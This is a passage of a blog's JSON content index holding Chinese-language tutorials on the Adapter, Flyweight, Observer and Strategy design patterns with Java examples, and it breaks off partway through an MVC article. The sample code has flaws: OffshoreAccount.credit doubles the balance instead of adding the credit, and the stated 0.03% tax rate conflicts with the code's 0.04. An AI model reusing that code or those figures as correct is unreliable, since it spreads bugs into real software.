https://quanke.gitbooks.io/design-pattern-java/content/%E6%A0%91%E5%BD%A2%E7%BB%93%E6%9E%84%E7%9A%84%E5%A4%84%E7%90%86%E2%80%94%E2%80%94%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F%EF%BC%88%E4%BA%94%EF%BC%89.html","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Design Pattern】结构类模式 -- 适配器模式 (Adapter Pattern)","date":"2018-11-12T01:25:23.000Z","path":"2018/11/12/【Design-Pattern】结构类模式-适配器模式-Adapter-Pattern/","text":"1 动机 希望复用一个已经存在的类 但这个类的接口与一个新类的接口不一致 不希望单纯地将已经存在的类中的代码完全复制到这个新类中 我们可以使用适配器模式来包装这个已经存在的类，使得接口得到统一，最终我们能够完全复用这个已经存在的类（而不是通过复制代码到新类中来实现）。 其实，这个思想类似于电源的转换器。比如，有一天，朋友送了我一个有英标插头的电器，我希望能够在家里使用： 希望直接利用墙上的中国标准插头来为这个电器提供电力； 墙上的插口是中国标准插孔，而这个电器拥有英国标准插头； 不希望改造现有的家里的供电系统，即通过自己在墙上造一个英标母插孔来实现对这个电器的电力供应（实在是小题大做了，费时费力，而且没有充分利用现有资源）； 同时，也不希望破坏这个新电器的现有结构（毕竟把英标插头剪掉，而通过自己接线把一个中国标准插头重新接到这个电器上的方式，可能会导致漏电安全隐患）。 最终，我们发明了一个叫电源转换器的东西。这样既没有破坏电器上的英标公插头，也没有破坏任何家中墙上的中标母插孔，同时也实现了对新电器的电力供应。 类似地，通过引入一个新类适配器，使得我们既没有改变一个新类的实现，也复用了一组已经存在且满足同一接口的类，同时这个新类在当前场景中能够被复用，而且满足这个接口。 在软件开发中，调用者（Client）虽然可以通过直接调用目标类以访问它所提供的服务（在英国，我们无需转换器即可直接使用这个电器）。 但是，我们希望这个目标新类能被复用的同时（我们能够使用这个电器），不破坏这个目标新类本身的实现（不破坏电器本身），通过某种方式实现，这个目标类也遵循 在现有体系中与这个目标类所行使职能类似的现有类的对应接口（在中国也能直接使用这个电器）。 换句话说，这个目标新类虽然可以满足调用者的基本任务完成需求，但它所提供的调用签名不一定是调用者所期望的，这可能是因为这个目标新类中定义的方法名 与 现有类对应的接口中的方法名的不一致导致的。 此时，需要将目标新类需要转换成调用者所期待的接口，才能实现对这个目标新类域现有类的统一。 在适配器模式中，可以通过引入一个包装类，来包装不兼容接口的实体，这个包装类就是适配器（Adapter），适配器所包装的实体就是被适配者（Adaptee），即被适配的类。 当调用者调用适配器的方法时，在适配器的内部将调用被适配者类的对应方法，这个过程对调用者来说是透明的（调用者并不直接访问被适配者类）。 最终，适配器使得接口不兼容的类最终可以一起工作。 2 定义适配器模式（Adapter Pattern）将一个特殊实现类转换为一个标准接口，最终，对于调用者而言，系统中所有实现类拥有统一的接口。 3 构成UML图 4 示例Lloyds银行是一家国际银行，并向全世界提供服务。 对于拥有海外账号（Offshore Account）的用户，税率为0.03%。 对于英国用户，提供两种账号：普通账号（Standard Account）和白金账号（Platinum Account）。且没有税率。 我们作为Lloyds银行系统的开发者，需要对外提供一个的账号信息接口（Account），以提供账号信息查询服务。 UML图 实现思路 为被适配者OffshoreAccount增加一个适配器AccountAdapter，使之遵循Account接口 OffshoreAccount.java12345678910111213141516171819202122232425262728public class OffshoreAccount &#123; private double balance; /** The tax for the country where the account is */ private static final double TAX_RATE = 0.04; public OffshoreAccount(final double balance) &#123; this.balance = balance; &#125; public double getTaxRate() &#123; return TAX_RATE; &#125; public double getOffshoreBalance() &#123; return balance; &#125; public void debit(final double debit) &#123; if (balance &gt;= debit) &#123; balance -= debit; &#125; &#125; public void credit(final double credit) &#123; balance += balance; &#125;&#125; Account.java12345public interface Account &#123; public double getBalance(); public boolean isOverdraftAvailable(); public void credit(final double credit);&#125; AbstractAccount.java123456789101112131415161718192021222324252627282930313233public class AbstractAccount implements Account &#123; private double balance; private boolean isOverdraftAvailable; public AbstractAccount(final double size) &#123; this.balance = size; &#125; @Override public double getBalance() &#123; return balance; &#125; @Override public boolean isOverdraftAvailable() &#123; return isOverdraftAvailable; &#125; public void setOverdraftAvailable(boolean isOverdraftAvailable) &#123; this.isOverdraftAvailable = isOverdraftAvailable; &#125; @Override public String toString() &#123; return getClass().getSimpleName() + \" Balance=\" + getBalance() + \" Overdraft:\" + isOverdraftAvailable(); &#125; @Override public void credit(final double credit) &#123; balance += credit; &#125;&#125; PlatinumAccount.java1234567public class PlatinumAccount extends AbstractAccount &#123; public PlatinumAccount(final double balance) &#123; super(balance); setOverdraftAvailable(true); &#125;&#125; StandardAccount.java1234567public class StandardAccount extends AbstractAccount &#123; public StandardAccount(final double balance) &#123; super(balance); setOverdraftAvailable(false); &#125;&#125; AccountAdapter.java1234567891011121314151617181920212223242526public class AccountAdapter extends AbstractAccount &#123; // Adaptee - The class we are adapting from private OffshoreAccount offshoreAccount; public AccountAdapter(final OffshoreAccount offshoreAccount) &#123; super(offshoreAccount.getOffshoreBalance()); // holds adaptee reference this.offshoreAccount = offshoreAccount; &#125; /** * Calculate offshore account balance after deducting the tax owed for * offshore account */ @Override public double getBalance() &#123; final double taxRate = offshoreAccount.getTaxRate(); final double grossBalance = offshoreAccount.getOffshoreBalance(); final double taxableBalance = grossBalance * taxRate; final double balanceAfterTax = grossBalance - taxableBalance; return balanceAfterTax; &#125;&#125; AdapterTest.java1234567891011public class AdapterTest &#123; public static void main(String[] args) &#123; Account sa = new StandardAccount(2000); System.out.println(\"Account Balance= \" + sa.getBalance()); //Calling getBalance() on Adapter Account adapter = new AccountAdapter(new OffshoreAccount(2000)); System.out.println(\"Account Balance= \" + adapter.getBalance()); &#125;&#125; 5 优点 将目标类与适配者类解耦，通过引入一个适配器类来重用现有的适配者类，且无需修改原有代码 6 缺点 对于Java、C#等不支持多重继承的语言，一次最多只能适配一个适配者类 7 适用场景 系统需要使用现有的类，而这些类的接口不需要系统的需要 又希望复用这些现有的类 8 模式应用Sun公司在1996年公开了Java语言的数据库连接工具JDBC，JDBC使得Java语言程序能够与数据库连接，并使用SQL语言来查询和操作数据。JDBC给出一个客户端通用的抽象接口，每一个具体数据库引擎（如SQL Server、Oracle、MySQL等）的JDBC驱动软件都是一个介于JDBC接口和数据库引擎接口之间的适配器软件。抽象的JDBC接口和各个数据库引擎API之间都需要相应的适配器软件，这就是为各个不同数据库引擎准备的驱动程序。 Reference Stacktips – Adapter Design Pattern In Java Graphic Design Patterns - 适配器模式","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Design Pattern】结构类模式 -- 享元模式 (Flyweight Pattern)","date":"2018-11-11T14:36:51.000Z","path":"2018/11/11/【Design-Pattern】结构类模式-享元模式-Flyweight-Pattern/","text":"1 动机通过尽可能共享对象中的数据来实现对内存的最小化使用，这就是享元模式的动机。 一个典型的例子是：在Word中，对字符的图形化展现。如果每一个显示的字符都对应一个独立的对象，这将会消耗大量的内存。取而代之，位于文档中不同位置的相同字符会共享大部分属性，而只有字符位置这样的属性才需要被单独保存。 2 定义享元模式（Flyweight Pattern）通过在享元工厂中引入享元池实现了对对象的多次复用，从而减少了内存的使用。 内蕴状态（intrinsic state）和外蕴状态（extrinsic state）享元对象能做到共享的关键是区分内蕴状态（intrinsic state）和外蕴状态（extrinsic state）。 内蕴状态（intrinsic state）：被共享，因为内蕴状态不会因为环境改变而被改变（invariant），或者说是上下文独立的（context independent）。比如，字符“A”在给定的一个字符集中的编码。 而外蕴状态（extrinsic state）会被实例独有，或者说同一类型的不同实例它们的外蕴状态会不同，比如在一个出现多次字符“A”的文档中，各个“A”的位置。 享元模式的广泛使用享元模式在文本编辑器系统中被大量应用，一个文本编辑器通常会提供多种不同的字体。我们可以将每一个已经使用到的字母做成享元对象（FlyweightConcreteClass）： 字母本身和字母对应的编码属于一个字母的內蕴状态 字母的位置、字体等则属于该字母的外蕴状态 在Java中， String类型就是使用了享元模式。String对象是final类型，对象一旦创建就不可改变。在JAVA中字符串常量都是存在常量池中的，JAVA会确保一个字符串常量在常量池中只有一个拷贝。String a=”abc”，其中”abc”就是一个字符串常量。 3 适用场景当存在以下情况时，可以考虑使用享元模式： 有大量对象存在的应用 存在占用内存较大或创建需耗费大量时间的对象 对象的属性可以被区分为固有属性（内蕴状态）和非固有属性（外蕴状态） 需要注意的是，享元模式中中需要维护一个记录了系统已有所有享元对象的表，这同样是需要耗费资源的。因此，只要在有足够多的享元实例可供共享时，才值得使用享元模式。 4 构成 抽象享元角色（FlyweightInterface）：定义享元类的接口，需要将对外蕴状态的操作（Operation）通过参数的形式传入方法中。 具体享元角色（ConcreteFlyweight）：实现抽象享元角色所规定的接口。如果有内蕴状态，可以将该内蕴状态存储于类内部。享元对象的内蕴状态与对象所处的上下文环境无关。 享元工厂角色（FlyweightFactory）：负责创建与管理享元角色。当调用者通过享元工厂获取一个享元对象时，享元工厂需要检查系统是否已经有一个已经存在的享元对象。如果有，则直接提供这个享元对象给调用者。若无，享元工厂则需要先创建一个享元对象（并将具体享元角色的实例存储于享元池（Flyweight Pool）中），再提供给调用者。 享元模式的核心在于享元工厂类，享元工厂提供了一个用于存储享元对象的享元池。当调用者需要某个享元对象时，享元工厂会先从享元池中获取，若不在，则会新实例化一个享元对象，并在享元池中增加该对象，并返回给用户。 UML图 抽象享元角色类1234public interface Flyweight &#123; //一个示意性方法，参数state是外蕴状态 public void operation(String state);&#125; 具体享元角色类1234567891011121314151617181920212223public class ConcreteFlyweight implements Flyweight &#123; private Character intrinsicState = null; /** * 构造函数，内蕴状态作为参数传入 * * @param state */ public ConcreteFlyweight(Character state) &#123; this.intrinsicState = state; &#125; /** * 外蕴状态作为参数传入方法中，改变方法的行为， * 但是并不改变对象的内蕴状态。 */ @Override public void operation(String state) &#123; // TODO Auto-generated method stub System.out.println(\"Intrinsic State = \" + this.intrinsicState); System.out.println(\"Extrinsic State = \" + state); &#125;&#125; 具体享元角色类（ConcreteFlyweight）可以有内蕴状态，内蕴状态的值应当在享元对象被创建时就被赋值。所有的内蕴状态在对象创建之后，就不会再改变了。 如果一个享元对象有外蕴状态的话，所有的外部状态都必须存储在客户端，在使用享元对象时，再由客户端传入享元对象。这里只有一个外蕴状态，operation()方法的参数state就是由外部传入的外蕴状态。 享元工厂角色类123456789101112131415public class FlyweightFactory &#123; private Map&lt;Character, Flyweight&gt; files = new HashMap&lt;Character, Flyweight&gt;(); public Flyweight factory(Character state) &#123; //先从缓存中查找对象 Flyweight fly = files.get(state); if (fly == null) &#123; //如果对象不存在则创建一个新的Flyweight对象 fly = new ConcreteFlyweight(state); //把这个新的Flyweight对象添加到缓存中 files.put(state, fly); &#125; return fly; &#125;&#125; 必须指出的是，客户端不可以直接将具体享元类实例化，而必须通过一个工厂对象，并调用其factory()方法得到享元对象。一般而言，享元工厂对象在整个系统中只有一个，因此也可以使用单例模式。 当客户端需要单纯享元对象的时候，需要调用享元工厂的factory()方法，并传入所需的单纯享元对象的内蕴状态，由工厂方法产生所需要的享元对象。 调用者123456789101112131415public class Client &#123; public static void main(String[] args) &#123; // TODO Auto-generated method stub FlyweightFactory factory = new FlyweightFactory(); Flyweight fly = factory.factory(new Character('a')); fly.operation(\"First Call\"); fly = factory.factory(new Character('b')); fly.operation(\"Second Call\"); fly = factory.factory(new Character('a')); fly.operation(\"Third Call\"); &#125;&#125; 5 示例UML图 实现思路 Shape接口：享元接口，图形接口 Line类：享元对象 Oval类：享元对象 ShapeFactory类：享元工厂，可以向调用者提供享元对象 Shape.java1234567import java.awt.Color;import java.awt.Graphics;public interface Shape &#123; public void draw(Graphics g, int x, int y, int width, int height, Color color);&#125; Line.java123456789101112131415161718192021import java.awt.Color;import java.awt.Graphics;public class Line implements Shape &#123; public Line()&#123; System.out.println(\"Creating Line object\"); // adding time delay：模拟一个类的实例化需要耗费大量时间 try &#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; @Override public void draw(Graphics line, int x1, int y1, int x2, int y2, Color color) &#123; line.setColor(color); line.drawLine(x1, y1, x2, y2); &#125;&#125; Oval.java123456789101112131415161718192021222324252627282930import java.awt.Color;import java.awt.Graphics;public class Oval implements Shape &#123; //intrinsic property private boolean fill; public Oval(boolean f)&#123; this.fill=f; System.out.println(\"Creating Oval object with fill=\"+f); // adding time delay：模拟一个类的实例化需要耗费大量时间 try &#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; @Override public void draw(Graphics circle, int x, int y, int width, int height, Color color) &#123; circle.setColor(color); circle.drawOval(x, y, width, height); if(fill)&#123; circle.fillOval(x, y, width, height); &#125; &#125;&#125; ShapeFactory.java1234567891011121314151617181920212223public class ShapeFactory &#123; private static final HashMap&lt;ShapeType,Shape&gt; shapes = new HashMap&lt;ShapeType,Shape&gt;(); public static Shape getShape(ShapeType type) &#123; Shape shapeImpl = shapes.get(type); if (shapeImpl == null) &#123; if (type.equals(ShapeType.OVAL_FILL)) &#123; shapeImpl = new Oval(true); &#125; else if (type.equals(ShapeType.OVAL_NOFILL)) &#123; shapeImpl = new Oval(false); &#125; else if (type.equals(ShapeType.LINE)) &#123; shapeImpl = new Line(); &#125; shapes.put(type, shapeImpl); &#125; return shapeImpl; &#125; public static enum ShapeType&#123; OVAL_FILL,OVAL_NOFILL,LINE; &#125;&#125; DrawingClient.java - 调用者调用代码每次点击DrawButton时，都会（随机指定位置、长度、高度和颜色）绘制一个随机图案： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import java.awt.BorderLayout;import java.awt.Color;import java.awt.Container;import java.awt.Graphics;import java.awt.event.ActionEvent;import java.awt.event.ActionListener;import javax.swing.JButton;import javax.swing.JFrame;import javax.swing.JPanel;public class DrawingClient extends JFrame&#123; private static final long serialVersionUID = -1350200437285282550L; private final int WIDTH; private final int HEIGHT; private static final ShapeType shapes[] = &#123; ShapeType.LINE, ShapeType.OVAL_FILL,ShapeType.OVAL_NOFILL &#125;; private static final Color colors[] = &#123; Color.RED, Color.GREEN, Color.YELLOW &#125;; public DrawingClient(int width, int height)&#123; this.WIDTH=width; this.HEIGHT=height; Container contentPane = getContentPane(); JButton startButton = new JButton(\"Draw\"); final JPanel panel = new JPanel(); contentPane.add(panel, BorderLayout.CENTER); contentPane.add(startButton, BorderLayout.SOUTH); setSize(WIDTH, HEIGHT); setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); setVisible(true); startButton.addActionListener(new ActionListener() &#123; public void actionPerformed(ActionEvent event) &#123; Graphics g = panel.getGraphics(); for (int i = 0; i &lt; 20; ++i) &#123; Shape shape = ShapeFactory.getShape(getRandomShape()); shape.draw(g, getRandomX(), getRandomY(), getRandomWidth(), getRandomHeight(), getRandomColor()); &#125; &#125; &#125;); &#125; private ShapeType getRandomShape() &#123; return shapes[(int) (Math.random() * shapes.length)]; &#125; private int getRandomX() &#123; return (int) (Math.random() * WIDTH); &#125; private int getRandomY() &#123; return (int) (Math.random() * HEIGHT); &#125; private int getRandomWidth() &#123; return (int) (Math.random() * (WIDTH / 10)); &#125; private int getRandomHeight() &#123; return (int) (Math.random() * (HEIGHT / 10)); &#125; private Color getRandomColor() &#123; return colors[(int) (Math.random() * colors.length)]; &#125; public static void main(String[] args) &#123; DrawingClient drawing = new DrawingClient(500,600); &#125;&#125; 结果分析由于对每个Shape对象进行初始化是非常耗时的，因此我们采用享元模式以避免多次初始化同一个类型的Shape对象。 在多次点击DrawButton后，就会出现这样的结果： 6 优缺点优点 大幅度地降低了内存中对象是数量 缺点 使得系统更加复杂（为了使对象可以共享，需要将一些状态外蕴化，这客观上导致系统的逻辑复杂了） 7 应用实例最典型的对享元模式的应用，是Java中对String的字符串常量池（String Constant Pool）的实现。 类似地，Java中包装类Integer、Byte、Boolean、Character等也采用了享元模式。 此外，享元模式在编辑器软件中大量使用，如在一个文档中多次出现相同的图片，则只需要创建一个图片对象，通过在应用程序中设置该图片出现的位置，可以实现该图片在不同地方多次重复显示。 Reference 《Java与模式》 Design Patterns: Elements of Reusable Object-Oriented Software JournalDev - Flyweight Design Pattern in Java - https://www.journaldev.com/1562/flyweight-design-pattern-java https://github.com/iluwatar/java-design-patterns/tree/master/flyweight","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Design Pattern】行为类模式 -- 观察者模式 (Obsever Pattern)","date":"2018-11-11T14:35:20.000Z","path":"2018/11/11/【Design-Pattern】行为类模式-观察者模式-Obesever-Pattern/","text":"1 定义观察者模式（Observer Pattern）定义了一种一对多的依赖对象关系，使得当那一个对象状态发生改变时，依赖它的多个对象均能得到通知并自动更新（做出相应反应）。 发生状态变化的对象叫观察目标（Subject），依赖它的多个对象叫观察者（Observers）。subject通知其observer的方式，通常以主动调用observer的特定方法进行。 这意味着，在subject中存在一个注册列表（Registered list），记录了当自己状态发生变化时，需要调用的每个observer对应的特定方法。 观察者模式的核心思想，与发布-订阅模式（Publish/Subscribe Pattern）非常类似的，即通过引入一个事件通知（Event Notification）机制将事件两端的对象（事件发生对象和关注该事件发生的对象）实现解耦。 而两者的区别在于： 耦合关系不同 在观察者模式中，Subject松耦合于Abstract Observer； 而发布-订阅模式可以看做是观察者模式的一种变种。通过引入Broker层，作为Subject与Observer之间的中间层，最终Subject与Observer之间不存在任何耦合 讨论的上下文所处的粒度不同 观察者模式往往在一个代码实现的上下文去讨论的（Design Pattern），即programming language specific； 而发布-订阅模式既可以在一个代码实现的上下文去讨论（Design Pattern），也可以从架构设计的角度讨论。这时，发布-订阅模式更多是一个架构模式（Architectural Pattern）。比如面向消息的中间件系统（message-oriented middleware system，MOMS）则是从架构层面实现了发布-订阅模式的一个典型例子，典型的面向消息的中间件系统包括JMS（Java Message Service）、ActiveMQ 同异步的实现不同 观察者模式往往以同步的方式实现，即当特定事件发生时，观察者（Observer）的事件处理方法被依次同步调用 发布-订阅模式往往以异步的方式实现。当特定事件发生（比如，一个特定的Topic）时，发布者（Publisher）通知消息队列（Message Queue）或Broker对象，此后通知结束。此后，订阅者再去消费这个事件。 2 特点 一个subject可以对应多个observer，这些observer之间可以没有任何关系（耦合）。 subject松依赖（松耦合）于observer，而observer不依赖于subject。 同时也可以根据需要随意地向subject增加或删除observer，这意味着系统非常易于扩展。 在应用观察者模式的过程中，通常包括三个行为： 添加（Attach）：将一个observer添加到subject中的注册列表（Registered list）中。这意味着当特定事件发生时，这个observer总能收到通知 移除（Detach）：将一个已经存在的observer从subject中的注册列表（Registered list）中移除。这意味着当被移除之后，特定事件发生时，这个observer也不会收到通知 通知（Notify）：subject调用observer提供的通知更新函数以告知observer此时事件发生 3 示例// TODO 4 优点 观察者模式符合“开闭原则”（Open/Closed Principle） 观察者模式可用于广播通信 观察者模式在subject和observer之间建立了一个抽象的耦合 使用观察者模式可以实现表现层和逻辑层的分离 5 缺点 如果在Observer和subject之间有循环依赖时，可能会导致触发无限通知调用，进而导致系统崩溃 6 Note6.1 Java的支持在JDK的java.util包中，提供了Observable类以及Observer接口，它们构成了Java语言对观察者模式的支持。 6.2 观察者模式在MVC中的应用在常用的MVC （Model - View - Controller）架构模式中也应用了观察者模式。MVC中包含三个角色：模型（Model）、视图（View）和控制器（Controller）。 其中 Model 对应于观察者模式中的 subject，而View对应于观察者模式中的observer。 当Model层中的特定事件发生（如数据发生改变）时，View层将收到通知（并更新显示的数据）， 7 Reference Observer pattern 观察者模式 Apple Cocoa - Model-View-Controller http://developers-club.com/posts/270339/ https://medium.com/@huytrongnguyen1985/from-pub-sub-pattern-to-observer-pattern-f4ae1e425cc9 http://developers-club.com/posts/270339/ https://hackernoon.com/observer-vs-pub-sub-pattern-50d3b27f838c","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Design Pattern】行为类模式 -- 策略模式 (Strategy Pattern)","date":"2018-11-11T14:34:12.000Z","path":"2018/11/11/【Design-Pattern】行为类模式-策略模式-Strategy-Pattern/","text":"动机 完成一项任务可以有多种不同的方法，每一种方法都可称为一个策略。在特定环境下，我们可以根据不同的需求和具体的环境来决定采用哪一个策略来完成特定的任务； 在软件开发中也是类似的，我们可以使用不同的策略来实现一项功能。比如排序，可以采用快排（Quick Sort），插入排序（Insert Sort）或选择排序（Selection Sort）等等。这些不同的排序算法都能实现排序功能，只是他们进行排序时的效率不同。因此，我们要根据具体的情况，来具体选择一个排序算法，以使得在当前情况中排序效率最高； 为了使系统具有较强的扩展性（可能在未来，我们还需要增加新的排序算法），我们的代码需要遵循开闭原则（The Open Closed Principle）； 同时，我们编写的这个类对应的调用者（Client），不应该依赖于这个类具体的实现（Implementation），而仅仅依赖于对应的抽象（Abstraction）。或者说，面向接口编程（Program to an interface, not an implementation）； 可能有人会提出，我们可以编写一个SortingHelper类（这个类实现了ISortingHelper接口），这个类中包含不同的方法，每个方法都是一种具体排序算法的实现（比如快排、插入排序等等）。很棒！这是一种很好的实现（具有扩展性，同时面向接口编程）。这种实现事实上对应了另一个设计模式，称为模板方法模式（Template Method Pattern）。但这样的实现无法做到在运行时可以任意地切换不同的排序算法； 我们也可以设计一个策略接口（对应于上面例子，则为排序帮助接口），同时包含多个实现了该接口的策略实现类（对应于上面例子，则为XX排序帮助类，如插入排序帮助类）。 定义策略模式中定义了一组可以相互替换（interchangeable）的策略（Strategy），每一个独立的策略都封装了一个算法（如排序）。 特点 包括一系列可以相互替换（interchangeable）的算法，这些算法的功能都是相同的，但实现的思路不同。如不同的排序算法（插入排序Insertion Sort，选择排序Selection Sort，合并排序Merge Sort），而排序后的结果都是相同的 每一个算法都可以被单独使用 调用者（Client）可以根据自己的需求决定采用哪一个具体的策略 只有在运行阶段（rum time），才确定哪个具体的策略被采用 构成 一个策略接口（Strategy Interface） 一个或多个具体的策略实现类（Concrete Strategy），且实现了策略接口 一个策略上下文对象，以允许调用者指定特定的策略 UML图 示例实现思路 定义一个策略接口（Strategy Interface），这个接口定义的策略类的行为 定义一个或多个具体的实现策略类（Concrete Strategy），这些类均实现了策略接口 定义一个策略上下文对象，其中包含setter和getter方法用于指定一个具体的实现策略类 UML图 SortingStrategy.java123public interface SortingStrategy &#123; public void sort(int[] numbers);&#125; SelectionSort.java123456789101112131415161718192021public class SelectionSort implements SortingStrategy &#123; @Override public void sort(int[] numbers) &#123; System.out.println(\"Selection Sort!\"); int i, j, first, temp; for (i = numbers.length - 1; i &gt; 0; i--) &#123; first = 0; for (j = 1; j &lt;= i; j++) &#123; if (numbers[j] &gt; numbers[first]) first = j; &#125; temp = numbers[first]; numbers[first] = numbers[i]; numbers[i] = temp; &#125; System.out.println(Arrays.toString(numbers)); &#125;&#125; InsertionSort.java123456789101112131415161718public class InsertionSort implements SortingStrategy &#123; @Override public void sort(int[] numbers) &#123; System.out.println(\"Insertion Sort!\"); for (int i = 1; i &lt; numbers.length; i++) &#123; int temp = numbers[i]; int j; for (j = i - 1; (j &gt;= 0) &amp;&amp; (numbers[j] &gt; temp); j--) &#123; numbers[j + 1] = numbers[j]; &#125; numbers[j + 1] = temp; &#125; System.out.println(Arrays.toString(numbers)); &#125;&#125; 12345678910111213141516public class SortingContext &#123; private SortingStrategy strategy; public void setSortingMethod(SortingStrategy strategy) &#123; this.strategy = strategy; &#125; public SortingStrategy getStrategy() &#123; return strategy; &#125; public void sortNumbers(int[] numbers)&#123; strategy.sort(numbers); &#125;&#125; TestMain.java调用者使用策略模式的方式： 1234567891011121314151617181920public class TestMain &#123; public static void main(String[] args) &#123; int numbers[] = &#123;20, 50, 15, 6, 80&#125;; SortingContext context = new SortingContext(); context.setSortingMethod(new InsertionSort()); context.sortNumbers(numbers); System.out.println(\"***********\"); context.setSortingMethod(new SelectionSort()); context.sortNumbers(numbers); // 输出： Insertion Sort! [6, 15, 20, 50, 80] *********** Selection Sort! [6, 15, 20, 50, 80] &#125;&#125; 讨论可能有人会提出，为什么不采用最简单的switch表达式的方式来替代上面的策略模式： 12345678910111213141516enum SortingMethod&#123; InsertionSort, SelectionSort&#125;public class SortingHelper &#123; public void sort(int[] numbers, SortingMethod sortEnum) &#123; switch(sortEnum)&#123; case SortingMethod.InsertionSort: // 进行插入排序 break; case SortingMethod.SelectionSort: // 进行选择排序 break; &#125; &#125; 事实上，如果采用这种方案实现，当我们需要增加新的排序策略时，不得不在switch中增加新的case。这样会违背开闭原则（Open-Closed Principle）。 优缺点优点 在运行时任意切换策略 可轻易地增加新的策略（通过增加一个新的策略实现类） 缺点 客观上增加了代码的复杂性，有几个策略，至少就有几个类 策略模式在Java中的应用使用策略模式的例子主要在Java.awt和Swing库中看到。 AWT中的LayoutManagerJava.awt类库需要在运行期间动态的由客户端决定一个Container对象怎样排列它所有的GUI构件。Java语言提供了几种不同的排列方式，包装在不同的类里： BorderLayout FlowLayout GridLayout GridBagLayout CardLayout 其类图如下： Swing中的Border在任何一个Swing构件上都可以画上边框(Border)，比如panel、button等，而Swing库提供了很多的边框类型，包括bevel、line、titled以及CompoundBorder类等，Swing构件的基类是JComponent类，而这个类负责为Swing构件画上边框。 JComponent类实现了paintBorder()方法，并且保持一个私有的对边框对象的引用。由于Border是一个接口而不是具体类，因此，这个引用可以指向任何实现了Border借口的边框对象。其类图如下： 在什么情况下使用策略模式 如果在一个系统里面有许多类，他们之间的区别仅仅在于他们的行为，那么使用策略模式可以动态地让一个对象在许多行为中选择一种行为。 一个系统需要动态的在几种算法中选择一种。那么这些算法可以包装到一个个的具体算法里面，而这些具体算法类都是一个抽象算法类的子类。换言之，这些具体算法类均有统一的接口，由于多态性原则，客户端可以选择使用任何一个具体算法类，并只持有一个数据类型是抽象算法类的对象。 一个系统的算法使用的数据不可以让客户端知道。策略模式可以避免让客户端涉及到不必要接触到的复杂的和只与算法有关的数据。 如果一个对象有很多的行为，如果不用恰当的模式，这些行为就只好使用多重的条件选择语句来实现。使用策略模式可以避免使用难以维护的多重条件选择语句。 Reference 《Java与模式》 Strategy Design Pattern in Java - http://stacktips.com/tutorials/design-patterns/strategy-design-pattern-in-java https://www.journaldev.com/1754/strategy-design-pattern-in-java-example-tutorial http://java-design-patterns.com/patterns/template-method/","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Architectural Pattern】Model – View – Controller (MVC)","date":"2018-11-11T14:31:26.000Z","path":"2018/11/11/【Architectural-Pattern】Model–view–controller-MVC/","text":"1 背景MVC （Model - View - Controller）架构是一种当前非常流行的架构模式（Architectural Pattern），被广泛使用于传统的桌面GUI（Graphical user interface）、Web应用和手机移动应用中。 1979年，MVC的概念被 Trygve Reenskaug 在 Smalltalk 中提出。这种架构模式，极大地降低了GUI应用程序的管理难度，而后被大量用于构建桌面和服务器端应用程序； 从1996年后，MVC逐渐被广泛应用； 2002年，基于Java的Web应用框架Spring引入了MVC的概念； 2005年，基于Python的Django和基于Ruby的Rails也引入了MVC的概念。 2 原始的MVC在最初以Smalltalk实现中MVC概念中，MVC是由组合模式（Composite Pattern）、策略模式（Strategy Pattern）和观察者模式（Observer Pattern）三种设计模式组合而成的。 Model-View-Controller (MVC)架构模式中定义一个应用中包括三种角色：模型（Model）、视图（View）和控制器（Controller）。 在MVC架构模式中，不仅定义了各个角色的职能，还明确了各个角色之间相互通信的方式。 关于 user action： 在前端框架的 MVC 中，由 View 接收到用户的交互操作，进而View传给Controller。 在后端框架的 MVC 中，由 Controller 直接接收 HTTP request，因此 User action 是给 Controller。 d 2.1 设计模式解析在原始MVC的这个架构模式中，涉及到了三种设计模式： Composite pattern：一个View（对应模式中的Composite）是一系列嵌套的View（对应模式中的Leaf）的组合 Strategy pattern：一个Controller实现了一个到多个View（分别对应模式中的ConcreteStragegyA，ConcreteStragegyB）。根据实际情况，确定Controller返回哪一个View给用户 Observer pattern： 一个Model对象会维护一系列关注Model状态变化的View。当该Model对象（对应模式中的Subject）状态发生变化时，对应的View（对应模式中的Observer）就会收到通知。 2.2 角色职能ModelsModels 层仅仅包括纯粹的业务逻辑（Bussiness Logic），通常还会将数据持久化（即Models 层包括将数据从数据库中存储和提取的逻辑） 而不关心数据在UI界面中如何展示与呈现。 ViewView层关注于数据的呈现，并且提供用户与数据交互（体现为对数据的增删查改）的场所。 View 层通过可视化（visual）的方式（User Interface）将用户感兴趣的数据展示出来，用户可通过与View进行交互实现对数据的增删查改（CURD）或进行相应的业务操作。 ControllerController层作为一个位于View层与Model层之间的协调者（intermediary），体现为处理用户交互，即，处理用户的输入和交互，并访问Model层，获取希望得到的数据，最终选择一个View，将数据显示出来。 2.3 通信方式当用户在 View 层中触发一个行为时（比如点击了一个Button），一个事件就产生了，Controller层会收到这个事件。 此时，Controller可以调用Model层，以触发特定的业务逻辑。或者，Controller也可以直接返回一个View或者在UI界面上作出相应变化。 由于特定View可以注册成为特定Model的观察者（Observer），当特定的Model的状态变化时，特定的View会收到通知，进而更新自己的UI界面（以告知用户特定的事件发生了）。 2.4 